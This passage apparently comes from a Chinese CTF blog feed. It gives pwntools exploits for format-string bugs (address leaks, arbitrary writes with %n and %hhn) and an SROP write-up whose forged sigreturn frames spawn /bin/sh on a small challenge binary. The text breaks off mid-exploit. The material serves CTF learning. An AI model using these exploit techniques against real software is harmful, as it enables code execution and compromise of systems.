punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功泄漏<code>puts</code>函数地址</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/11.png"></p><h4 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h4><p>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span>n<span class="token punctuation">,</span>不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试程序来自wiki：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加了一句</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload：</p><pre class="line-numbers language-none"><code class="language-none">...[overwrite addr]....%[overwrite offset]$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所<strong>要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数</strong>。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h5 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h5><ul><li><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输<strong>出了 c 变量的地址。</strong></p></li><li><p>确定相对偏移：其次，我们来确定一下<strong>存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。</strong> 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试：</p></li></ul><p>可以发现格式化字符串的地址为0xffffcfff8，则(0xffffcfff8 - 0xffffcfe0) // 4 = 6，所有格式化字符串的地址为格式化字符串的第6个参数，为printf的第7个参数</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/12.png"></p><ul><li>进行覆盖</li></ul><p>这样，我们便可以利用 %n 的特征来修改 c 的值。payload 如下：</p><p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。%6$n是把之前输出的字符个数写入格式化字符串的第6个参数。</p><pre class="line-numbers language-none"><code class="language-none">[addr of c]%012d%6$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow"</span><span class="token punctuation">)</span>c_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%12d%6$n'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    c<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功输出 modified c. </p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/13.png"></p><h5 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h5><h6 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h6><p>首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。如果我们还是将<strong>要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</strong></p><p>那么我们应该怎么做呢？其实没必要将所要覆盖的变量的地址放在字符串的最前，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aa<span class="token operator">%</span>k$nxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么<strong>其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数</strong>，后面我们<strong>如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8</strong>，其实就可以覆盖了。</p><ul><li>确定覆盖地址：a是初始化的全局变量，在bss段中，直接在IDA里面找：0x804A024</li></ul><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/14.png"></p><ul><li>确定相对偏移</li></ul><p>根据上面分析，为格式化字符串第8个参数</p><ul><li>进行覆盖</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token char">'aa%8$naa'</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x804A028</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow"</span><span class="token punctuation">)</span>c_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%12d%6$n'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804A028</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/15.png"></p><p>总结：其实，我们没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p><h6 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h6><p>首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以<strong>小端存储，即最低有效位存储在低地址</strong>。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">hh 对于整数类型，printf期待一个从<span class="token keyword">char</span>提升的<span class="token keyword">int</span>尺寸的整型参数。h  对于整数类型，printf期待一个从<span class="token keyword">short</span>提升的<span class="token keyword">int</span>尺寸的整型参数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以说，我们可以利用**%hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。**这里，我们以单字节为例。</p><ul><li><p>确定覆盖地址：同a一样的方法，地址为：0x804A02C</p></li><li><p>确定相对偏移：我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><pre class="line-numbers language-none"><code class="language-none">0x0804A028 \x780x0804A029 \x560x0804A02a \x340x0804A02b \x12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先，由于我们的字符串的偏移为 6，所以确定我们的 payload 基本是这个样子的</p><pre class="line-numbers language-none"><code class="language-none">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$hhn'+pad2+'%7$hhn'+pad3+'%8$hhn'+pad4+'%9$hhn'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进行覆盖</p></li></ul><p>payload构造(来自wiki：</p><p>其中每个参数的含义基本如下：</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#如果之前输出的字符个数&lt;要填写的值，就需要补上(wrod-prev)个字符输出</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span> <span class="token comment">#如果之前输出的字符个数=要填写的值，就不需要pad了</span>        result <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#如果之前输出的字符个数&gt;要填写的值</span>    <span class="token comment">#因为我们只填写一个字节，所以我们只需要低字节为我们要填写的值即可</span>    <span class="token comment">#比如prev=0x78 word=0x56</span>    <span class="token comment">#那么我们就需要补上一些pad，使得之前输出的子串个数为prev+pad = 0x156</span>    <span class="token comment">#所以pad = 0x156 - prev = 0x100 + word - prev = 256 + word - prev</span>    <span class="token comment">#注意为什么是0x156,而不是0x256等等,有的同学会问，如果前面已经输出0x178个字符，那这样算出来pad不是负数吗？</span>    <span class="token comment">#其实是这样的，但是因为我们是一个字节一个字节的填写，所以我们传入的prev也只是一个字节，可以看fmt_str函数，所以就统一成了0x100，因为0x200,0x300其实没有区别，因为我们只需要低字节</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token comment">#根据机器字长构造前面要覆盖的地址</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#payload现在的长度</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#我们一个字节一个字节的填写，所以需要填写4次</span>        <span class="token comment">#prev之前输出字符的个数</span>        <span class="token comment">#(target &gt;&gt; i * 8) &amp; 0xff 我们要覆盖的单字节的值</span>         <span class="token comment">#比如0x12345678第1次 (0x12345678 &gt;&gt; 0 * 8) &amp; 0xff = 0x78</span>         <span class="token comment">#第2次  (0x12345678 &gt;&gt; 1 * 8) &amp; 0xff = 0x56 ....</span>        <span class="token comment">#覆盖的偏移：</span>         <span class="token comment">#比如0x78它的偏移就是offset，而0x56的偏移为offset+1 ....</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token comment">#之前输出字符的个数</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A02C</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/16.png"></p><p>参考文章：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-SROP</title>
      <link href="/2023/04/08/pwn-srop/"/>
      <url>/2023/04/08/pwn-srop/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h3><h4 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h4><p><code>signal</code>机制是类unix系统中进程间通信的一种方式。我们称其为软中断信号，或者软中断。一般分为三步：</p><p><img src="/2023/04/08/pwn-srop/ProcessOfSignalHandlering.png" alt="图片来自wiki"></p><ul><li>内核向某个进程发送 <code>signal</code> 机制，该进程会被暂时挂起，进入内核态；</li><li>内核会为该进程保存相应的上下文，之后跳转到注册好的 <code>signal handler</code> 中处理相应的 <code>signal</code>；</li><li><code>signal handler</code> 返回后，内核执行 <code>sigreturn</code> 系统调用，为该进程恢复之前保存的上下文。</li></ul><p>1、<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 <code>signal</code> 的时候会被间接地调用。</p><p>2、内核在保存进程相应的上下文时，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址，需要注意的是，这一部分是在用户进程的地址空间的</strong>。称 <code>ucontext</code> 以及 <code>siginfo</code> 这一段为 <code>Signal Frame</code>，此时栈结构如下：</p><p><img src="/2023/04/08/pwn-srop/signal2-stack.png"></p><p>3、内核在恢复进程相应的上下文时，<strong>其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行</strong>。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>内核在 <code>signal</code> 信号处理的过程中的工作，主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 <code>Signal Frame</code> 中。但是需要注意的是：</p><ul><li><code>Signal Fram</code>e 被保存在<strong>用户的地址空间中，所以用户是可以读写的</strong>。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 <code>signal</code> 对应的 <code>Signal Frame</code>，所以<strong>当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame</strong>。</li></ul><p>也就是说我们可以伪造一个<code>Signal Frame</code>，然后主动去执行 <code>sigreturn</code> 系统调用，这时内核会以为我们是从<code>singal hanlder</code>返回的，所以就会恢复进程上下文，这时就可以修改所有寄存器的值为我们伪造<code>Sinal Frame</code>中的值。</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>1、如下图，我们在栈中伪造一个<code>Sinal Frame</code>，当我们执行 <code>sigreturn</code> 系统调用时，寄存器中的值就会被修改：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax<span class="token operator">=</span><span class="token number">59</span>rdi<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token string">"/bin/sh"</span>rsi<span class="token operator">=</span><span class="token number">0</span>rdx<span class="token operator">=</span><span class="token number">0</span>rip<span class="token operator">=</span><span class="token operator">&amp;</span>syscall这就是execv的一个系统调用，接下来会去执行<span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/pwn-srop/srop-example-1.png"></p><p>2、在1）例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可：</p><ul><li><strong>控制栈指针rsp。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 <code>syscall</code> 返回的时候，栈指针都会指向下一个 <code>Signal Frame</code>。因此就可以执行一系列的 <code>sigreturn</code> 函数调用。</p><p><img src="/2023/04/08/pwn-srop/srop-example-2.png"></p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容(伪造Signal Frame</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall(syscall_ret)</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 Signal Frame</li></ul><p>对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现 sigreturn 调用。而 <strong>RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制</strong>，比如说 read 函数的返回值为读取的字节数。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><h5 id="360春秋杯——smallest-pwn"><a href="#360春秋杯——smallest-pwn" class="headerlink" title="360春秋杯——smallest-pwn"></a>360春秋杯——smallest-pwn</h5><p>程序只开启了NX保护，但是代码甚少，我们可用的代码如下图：</p><p>程序直接向栈顶写入0x400个字符</p><p><img src="/2023/04/08/pwn-srop/1.png"></p><ul><li>这个题就是典型的<strong>通过 read 函数返回值来间接修改RAX 寄存器的值</strong></li><li>题目中并没有<code>/bin/sh</code>字符串，这里需要我们自己写入，但这个程序很小没有BSS段，所以我们直接把<code>/bin/sh</code>写在栈上<ul><li>所以我们要泄漏栈地址</li><li>然后把<code>/bin/sh</code>写入栈上</li></ul></li><li>伪造Signal Frame，执行execv函数</li></ul><p><strong>exp：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25526</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./smallest"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""0x4000B0 xor rax, rax0x4000B3 mov edx, 400h    0x4000B8 mov rsi, rsp 0x4000BB mov rdi, rax  0x4000BE syscall 0x4000C0 ret"""</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x4000BE</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token comment">#这里需要三次,第一次修改低字节为B3,第二次泄漏栈地址,第三次写入payload执行后期操作</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\xB3'</span><span class="token punctuation">)</span> <span class="token comment">#把低字节修改为B3,而跳过xor rax,rax,且read只读入一个字符,所以返回值rax=1,为write系统调用号</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#控制rsp到stack上</span>read_frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>read_frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>read_frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>read_frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> stackread_frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x400</span>read_frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stackread_frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>read_frame<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#read读取15个字符,返回值rax=15,为sigreturn系统调用号,且避免前之前的payload覆盖,所以就直接把payload的8-23个字符写入</span><span class="token comment">#向栈上写入'/bin/sh\x00',并执行execv</span>execv_frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>execv_frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>execv_frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack <span class="token operator">+</span> <span class="token number">0x120</span>execv_frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>execv_frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>execv_frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stackexecv_frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>execv_frame<span class="token punctuation">)</span>payload 